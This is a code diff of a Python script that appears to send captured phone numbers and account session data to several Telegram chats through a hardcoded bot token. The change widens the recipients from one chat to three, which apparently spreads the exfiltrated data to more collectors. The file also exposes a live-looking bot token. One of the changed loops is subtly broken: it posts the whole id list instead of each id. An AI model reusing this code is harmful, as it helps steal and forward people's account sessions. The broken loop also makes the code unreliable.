@@ -3,7 +3,7 @@ import requests
 from datetime import datetime
 
 BOT_TOKEN = '8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk'
-CHAT_ID = 7669456027
+CHAT_ID = [7669456027, 7669630491, 7421128257]
 bot = telebot.TeleBot(BOT_TOKEN)
 
 #lucky
@@ -16,10 +16,11 @@ def send_number_to_telegram(session_data: dict):
     )
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": text
-    })
+    for chat_id in CHAT_ID:
+        requests.post(url, json={
+            "chat_id": chat_id,
+            "text": text
+        })
 
 def send_session_to_telegram(session_data: dict):
     text = (
@@ -31,10 +32,12 @@ def send_session_to_telegram(session_data: dict):
     )
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": text
-    })
+    for chat_id in CHAT_ID:
+        requests.post(url, json={
+            "chat_id": CHAT_ID,
+            "text": text
+        })
+
 
 
 
